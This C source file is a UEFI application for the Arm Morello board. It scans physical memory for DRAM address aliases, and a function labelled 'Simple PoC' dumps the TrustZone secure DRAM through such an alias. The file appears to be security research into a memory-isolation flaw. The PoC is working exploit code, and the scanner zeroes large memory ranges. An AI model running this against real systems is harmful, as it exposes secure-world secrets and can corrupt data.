#include <efi.h>
#include <efilib.h>
#include <efidebug.h>


/* Borrowed code from ARM TF-A for formatting. */
#define bool	_Bool

#define true	(0 < 1)
#define false	(0 > 1)

#define va_list __builtin_va_list
#define va_start(ap, last) __builtin_va_start(ap, last)
#define va_end(ap) __builtin_va_end(ap)
#define va_copy(to, from) __builtin_va_copy(to, from)
#define va_arg(to, type) __builtin_va_arg(to, type)

#define get_num_va_args(_args, _lcount)                 \
    (((_lcount) > 1)  ? va_arg(_args, long long int) :  \
    (((_lcount) == 1) ? va_arg(_args, long int) :       \
                va_arg(_args, int)))

#define get_unum_va_args(_args, _lcount)                \
    (((_lcount) > 1)  ? va_arg(_args, unsigned long long int) :     \
    (((_lcount) == 1) ? va_arg(_args, unsigned long int) :      \
                va_arg(_args, unsigned int)))

int putchar(int c) {
  CHAR16 buf[2];
  buf[0] = c;
  buf[1] = 0;
  ST->ConOut->OutputString(ST->ConOut, buf);
  return 0;
}

static int string_print(const char *str)
{
    int count = 0;

    for ( ; *str != '\0'; str++) {
        (void)putchar(*str);
        count++;
    }

    return count;
}

static int unsigned_num_print(unsigned long long int unum, unsigned int radix,
                  char padc, int padn)
{
    /* Just need enough space to store 64 bit decimal integer */
    char num_buf[20];
    int i = 0, count = 0;
    unsigned int rem;

    do {
        rem = unum % radix;
        if (rem < 0xa)
            num_buf[i] = '0' + rem;
        else
            num_buf[i] = 'a' + (rem - 0xa);
        i++;
        unum /= radix;
    } while (unum > 0U);

    if (padn > 0) {
        while (i < padn) {
            (void)putchar(padc);
            count++;
            padn--;
        }
    }

    while (--i >= 0) {
        (void)putchar(num_buf[i]);
        count++;
    }

    return count;
}

/*******************************************************************
 * Reduced format print for Trusted firmware.
 * The following type specifiers are supported by this print
 * %x - hexadecimal format
 * %s - string format
 * %d or %i - signed decimal format
 * %u - unsigned decimal format
 * %p - pointer format
 *
 * The following length specifiers are supported by this print
 * %l - long int (64-bit on AArch64)
 * %ll - long long int (64-bit on AArch64)
 * %z - size_t sized integer formats (64 bit on AArch64)
 *
 * The following padding specifiers are supported by this print
 * %0NN - Left-pad the number with 0s (NN is a decimal number)
 *
 * The print exits on all other formats specifiers other than valid
 * combinations of the above specifiers.
 *******************************************************************/
int vprintf(const char *fmt, va_list args)
{
    int l_count;
    long long int num;
    unsigned long long int unum;
    char *str;
    char padc = '\0'; /* Padding character */
    int padn; /* Number of characters to pad */
    int count = 0; /* Number of printed characters */

    while (*fmt != '\0') {
        l_count = 0;
        padn = 0;

        if (*fmt == '%') {
            fmt++;
            /* Check the format specifier */
loop:
            switch (*fmt) {
            case '%':
                (void)putchar('%');
                break;
            case 'i': /* Fall through to next one */
            case 'd':
                num = get_num_va_args(args, l_count);
                if (num < 0) {
                    (void)putchar('-');
                    unum = (unsigned long long int)-num;
                    padn--;
                } else
                    unum = (unsigned long long int)num;

                count += unsigned_num_print(unum, 10,
                                padc, padn);
                break;
            case 's':
                str = va_arg(args, char *);
                count += string_print(str);
                break;
            case 'p':
                unum = (uintptr_t)va_arg(args, void *);
                if (unum > 0U) {
                    count += string_print("0x");
                    padn -= 2;
                }

                count += unsigned_num_print(unum, 16,
                                padc, padn);
                break;
            case 'x':
                unum = get_unum_va_args(args, l_count);
                count += unsigned_num_print(unum, 16,
                                padc, padn);
                break;
            case 'z':
                if (sizeof(size_t) == 8U)
                    l_count = 2;

                fmt++;
                goto loop;
            case 'l':
                l_count++;
                fmt++;
                goto loop;
            case 'u':
                unum = get_unum_va_args(args, l_count);
                count += unsigned_num_print(unum, 10,
                                padc, padn);
                break;
            case '0':
                padc = '0';
                padn = 0;
                fmt++;

                for (;;) {
                    char ch = *fmt;
                    if ((ch < '0') || (ch > '9')) {
                        goto loop;
                    }
                    padn = (padn * 10) + (ch - '0');
                    fmt++;
                }
            default:
                /* Exit on any other format specifier */
                return -1;
            }
            fmt++;
            continue;
        }
        (void)putchar(*fmt);
        fmt++;
        count++;
    }

    return count;
}

int printf(const char *fmt, ...)
{
    int count;
    va_list va;

    va_start(va, fmt);
    count = vprintf(fmt, va);
    va_end(va);

    return count;
}

void *memcpy(void *dst, const void *src, size_t len)
{
    const char *s = src;
    char *d = dst;

    while (len--)
        *d++ = *s++;

    return dst;
}

int memcmp(const void *s1, const void *s2, size_t len)
{
    const unsigned char *s = s1;
    const unsigned char *d = s2;
    unsigned char sc;
    unsigned char dc;

    while (len--) {
        sc = *s++;
        dc = *d++;
        if (sc - dc)
            return (sc - dc);
    }

    return 0;
}

/* Shim SetMem to POSIX memset. */
void* memset(void* dst, int val, size_t count) {
  ST->BootServices->SetMem(dst, count, val);
  return 0;
}

/* Discover aliasing in the specified range. Beware that it will be zero'd,
   which can cause a hang if something important is overwritten. */
void find_alias_overwrite_addr(uint64_t start, uint64_t end) {
  uint64_t aliased_region_start = 0;
  uint64_t region_start_data = 0;
  printf("configuring el1 data cacheability...\r\n");
  uint64_t sctlr_el1 = 0;
  __asm__ volatile("mrs %0, SCTLR_EL1" : "=r"(sctlr_el1));
  sctlr_el1 = sctlr_el1 & ~(1 << 2); // clear SCTLR_EL1.C
  __asm__ volatile("msr SCTLR_EL1, %0" :: "r"(sctlr_el1));
  printf("zeroing range! (0x%zx to 0x%zx)\r\n", start, end);
  memset((void*)start, 0, end - start);
  printf("starting scan! (0x%zx to 0x%zx)\r\n", start, end);
  for (uint64_t cur = start; cur < end; cur += sizeof(uint64_t)) {
    if (cur % 4194304 == 0) {
      printf("at address 0x%zx!\r\n", cur);
    }
    if (*(unsigned char*)cur != 0x00 && aliased_region_start == 0) {
      aliased_region_start = cur;
      region_start_data = *(uint64_t*)cur;
    } else if (*(unsigned char*)cur == 0x00 && aliased_region_start != 0) {
      printf("found aliased region! start 0x%zx end 0x%zx\r\n", aliased_region_start, cur - 1);
      if (aliased_region_start - cur + 1 >= sizeof(uint64_t)) {
        printf("|-> data at start of region: 0x%zx\r\n", region_start_data);
      }
      aliased_region_start = 0;
    }
    *(uint64_t*)cur = cur;
  }
}

/* Parameters for scanning on Morello. */
#define MORELLO_TZDRAM_START 0xff000000
#define MORELLO_TZDRAM_END  0x101000000
#define DRAM0_ALIAS_OFFSET   0x8380000000

void dump_range(uint64_t start, uint64_t end) {
  printf("dumping 0x%zx to 0x%zx\r\n", start, end);
  for (uint64_t line = start; line < end; line += 16) {
    printf("0x%zx: %zx %zx\r\n", line, *(long*)line, *(long*)(line + 8));
  }
}

/* Simple PoC. dump out the alias of TZDRAM. */
void dump_aliased_tzdram() {
  printf("configuring EL1 data cacheability...\r\n");
  uint64_t sctlr_el1 = 0;
  __asm__ volatile("mrs %0, SCTLR_EL1" : "=r"(sctlr_el1));
  sctlr_el1 = sctlr_el1 & ~(1 << 2); // clear SCTLR_EL1.C
  __asm__ volatile("msr SCTLR_EL1, %0" :: "r"(sctlr_el1));
  printf("TZDRAM alias:\r\n");
  dump_range(MORELLO_TZDRAM_START + DRAM0_ALIAS_OFFSET, MORELLO_TZDRAM_END + DRAM0_ALIAS_OFFSET);
  printf("done!\r\n");
}

EFI_STATUS
efi_main(
         EFI_HANDLE image_handle,
         EFI_SYSTEM_TABLE *systab
         )
{
    EFI_STATUS result;
    EFI_INPUT_KEY Key;

    ST = systab;

    uint64_t pc;
    asm volatile ("adr %0, ." : "=r" (pc));
    printf("\r\n\r\npc: 0x%zx\r\n", pc);
    printf("soothing watchdog...\r\n");
    result = ST->BootServices->SetWatchdogTimer(0, 0, 0, NULL);
    if(result != EFI_SUCCESS)
      printf("failed to soothe watchdog!!\r\n");
    /* Example range for Morello. Needs changing based on memory map. */
    find_alias_overwrite_addr(0x8080000000, 0x8477E40000);
    /* dump_aliased_tzdram(); */

    result = ST->ConIn->Reset(ST->ConIn, FALSE);
    if (EFI_ERROR(result))
        return result;

    while ((result = ST->ConIn->ReadKeyStroke(ST->ConIn, &Key)) == EFI_NOT_READY) ;

    return result;
}

